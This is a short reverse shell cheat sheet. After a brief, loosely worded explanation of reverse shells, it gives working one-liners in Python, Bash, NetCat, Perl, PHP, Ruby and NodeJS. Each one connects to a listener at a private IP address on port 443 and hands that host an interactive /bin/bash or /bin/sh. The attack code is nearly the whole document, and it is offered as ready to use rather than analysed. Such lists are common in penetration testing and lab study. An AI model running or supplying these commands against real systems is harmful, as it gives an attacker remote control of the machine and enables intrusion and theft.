Reverse Shell Cheat Sheet

What are Reverse Shells?

We understand that to establish a reverse shell connection is when you are listening from any port with programs such as NetCat, then when you are in listening mode there you are listening to view incoming connections via protocols such as TCP/UDP. Reverse shells are known as a way of attack, but also one of the functionalities of this is to connect as a client to the shell (terminal) of the corresponding person who ran the connection service from a terminal.

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.20",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

Bash

Bash reverse shells operate on Linux/Unix systems.

bash -c 'bash -i >& /dev/tcp/192.168.0.28/443 0>&1 &'

NetCat

NetCat is available on Linux/Unix systems.

nc -e /bin/sh 192.168.0.28 443

Perl

Perl Reverse Shell

perl -e 'use Socket;$i="192.168.0.28";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'


PHP

PHP, a language that can establish TCP/UDP connections.

php -r '$sock=fsockopen("192.168.0.28",443);exec("/bin/bash -i <&3 >&3 2>&3");'

Ruby

Ruby, pure and hard language.

ruby -rsocket -e'f=TCPSocket.open("192.168.0.28",443).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'


NodeJS

NodeJS, widely used in the branch.

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(443, "192.168.0.12", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/
})();
